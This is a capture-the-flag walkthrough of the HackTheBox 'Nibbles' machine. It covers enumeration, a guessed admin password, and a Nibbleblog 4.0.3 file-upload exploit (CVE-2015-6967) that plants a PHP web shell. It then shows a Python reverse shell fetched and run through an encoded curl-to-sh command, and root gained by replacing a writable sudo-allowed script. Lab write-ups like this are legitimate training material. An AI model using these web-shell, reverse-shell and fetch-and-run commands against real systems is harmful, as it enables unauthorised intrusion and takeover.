### Nibble HackTheBox

### Difficulty = Easy

### IP Address = 10.10.10.75

Nmap Scan:

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Nibble]
└─$ nmap -sCV -A 10.10.10.75 -p22,80 -oN nmapscan
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-29 02:32 WAT
Nmap scan report for 10.10.10.75
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.92 seconds
```

Lets check out the web server running on port 80

It just says hello world
![image](https://user-images.githubusercontent.com/113513376/215299213-2dbb279e-201c-4f87-9a4e-a7e2dafd607b.png)

Checking source code reveals a directory
![image](https://user-images.githubusercontent.com/113513376/215299229-a49234bc-ec89-40a7-9f93-e141fc384435.png)

On navigating to the directory shows a blog page
![image](https://user-images.githubusercontent.com/113513376/215299268-b52c766f-fd77-4909-a7c4-98cea2e001df.png)

But no content (post) is there 

I'll fuzz for directories

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Nibble]
└─$ gobuster dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.75/nibbleblog/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2023/01/29 02:37:58 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 321] [--> http://10.10.10.75/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
/content              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/content/]
/index.php            (Status: 200) [Size: 2987]
/languages            (Status: 301) [Size: 325] [--> http://10.10.10.75/nibbleblog/languages/]
/plugins              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/plugins/]
/README               (Status: 200) [Size: 4628]
/themes               (Status: 301) [Size: 322] [--> http://10.10.10.75/nibbleblog/themes/]
Progress: 4614 / 4615 (99.98%)
===============================================================
2023/01/29 02:39:55 Finished
===============================================================
```

On navigating to `admin.php` shows a login page
![image](https://user-images.githubusercontent.com/113513376/215299373-a5a39af0-0f58-4544-b9e5-c9f3eac9ec37.png)

I don't know the user or password to use

So lets loot the web page to see if we can get any thing

On heading over to /content i got a file which showed the username for the admin page which is `admin`
![image](https://user-images.githubusercontent.com/113513376/215299778-4178b16a-767e-4031-b6dc-fd80d4dc5810.png)

```
URL: http://10.10.10.75/nibbleblog/content/private/users.xml
```

What is also interesting is that it blacklists IP that sends too much request to it 

And i was fuzzing for username while im currently doing this box

So brute forcing the login page won't be possible

Then i tried using the box name as password and it worked 
![image](https://user-images.githubusercontent.com/113513376/215299856-a30ef583-8571-4eb6-9c5d-f53de5d632df.png)

```
Credential: admin:nibbles
```

Cool now lets get shell via this

On checking the setting I get the version being used which is `Nibbleblog 4.0.3`
![image](https://user-images.githubusercontent.com/113513376/215300063-2679ba1f-72e3-4d94-ab84-21bd05f93f70.png)

Searching for exploit leads here [Exploit](https://github.com/dix0nym/CVE-2015-6967)

Lets run it and check it out

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Nibble]
└─$ python3 exploit.py                                                                                                             
usage: exploit.py [-h] --url URL --username USERNAME --password PASSWORD --payload PAYLOAD
exploit.py: error: the following arguments are required: --url/-l, --username/-u, --password/-p, --payload/-x
```

I'll run the exploit now using all arguments needed

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Nibble]
└─$ cat shell.php 
<?php system($_GET['cmd']); ?>
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Nibble]
└─$ python3 exploit.py --url http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload shell.php
[+] Login Successful.
[+] Upload likely successfull.
[+] Exploit launched, check for shell
```

Now it uploaded in `/content/private/plugins/my_image/image.php`

So lets go check it out 
![image](https://user-images.githubusercontent.com/113513376/215300265-0e353242-a659-4328-ab74-a50aeaa168a3.png)

Cool we have RCE. Lets get a more stable shell

```
### Attacker
┌──(mark__haxor)-[~/Desktop/Scripts]
└─$ cat shell.sh 
#!/bin/bash

export RHOST="10.10.16.7";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/Desktop/Scripts]
└─$ pyws -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.75 - - [29/Jan/2023 03:05:07] "GET /shell.sh HTTP/1.1" 200 -

### Target 
URL: 10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd=%63%75%72%6c%20%31%30%2e%31%30%2e%31%36%2e%37%2f%73%68%65%6c%6c%2e%73%68%7c%73%68
```

Back on the nc listener we get a connection back

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Nibble]
└─$ nc -lvnp 4444    
listening on [any] 4444 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.75] 51572
$
```

Now lets stabilize it 

```
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
CTRL + Z
stty raw -echo;fg
reset
```

Now lets get root

On checking sudo permission shows that the user can run a script as root

```
nibbler@Nibbles:/home/nibbler$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
nibbler@Nibbles:/home/nibbler$
```

Here's the content of the script 

```
nibbler@Nibbles:/home/nibbler$ ls -l /home/nibbler/personal/stuff/monitor.sh                                                                                                                                       
ls: cannot access '/home/nibbler/personal/stuff/monitor.sh': No such file or directory                                                                                                                             
nibbler@Nibbles:/home/nibbler$ ls                                                                                                                                                                                  
personal.zip  user.txt                                                                                                                                                                                             
nibbler@Nibbles:/home/nibbler$ unzip personal.zip                                                                                                                                                                  
Archive:  personal.zip                                                                                                                                                                                             
   creating: personal/                                                                                                                                                                                             
   creating: personal/stuff/                                                                                                                                                                                       
  inflating: personal/stuff/monitor.sh                                                                                                                                                                             
nibbler@Nibbles:/home/nibbler$ cd personal/stuff/                                                                                                                                                                  
nibbler@Nibbles:/home/nibbler/personal/stuff$ l                                                                                                                                                                    
l: command not found                                                                                                                                                                                               
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls                                                                                                                                                                   
monitor.sh                                                                                                                                                                                                         
nibbler@Nibbles:/home/nibbler/personal/stuff$ wc -l monitor.sh
117 monitor.sh
```

Now checking the permission on monitor.sh shows we have full access

```
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -l monitor.sh 
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$
```

So all we need is to just replace it and get root

```
nibbler@Nibbles:/home/nibbler/personal/stuff$ cat pwned.sh 
/bin/bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ mv monitor.sh monitor_real.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ mv pwned.sh monitor.sh 
nibbler@Nibbles:/home/nibbler/personal/stuff$ chmod +x monitor.sh 
nibbler@Nibbles:/home/nibbler/personal/stuff$ 
```

Now lets run sudo as root

```
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
    
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
root@Nibbles:/home/nibbler/personal/stuff# cd /root
root@Nibbles:~# ls
root.txt
root@Nibbles:~# ls -al
total 32
drwx------  4 root root 4096 Dec 15  2020 .
drwxr-xr-x 23 root root 4096 Dec 15  2020 ..
-rw-------  1 root root    0 Dec 29  2017 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Dec 10  2017 .cache
drwxr-xr-x  2 root root 4096 Dec 10  2017 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root 1091 Dec 15  2020 .viminfo
-r--------  1 root root   33 Jan 28 17:48 root.txt
root@Nibbles:~# 
```

And we're done 


<br> <br>
[Back To Home](../../index.md)
<br>
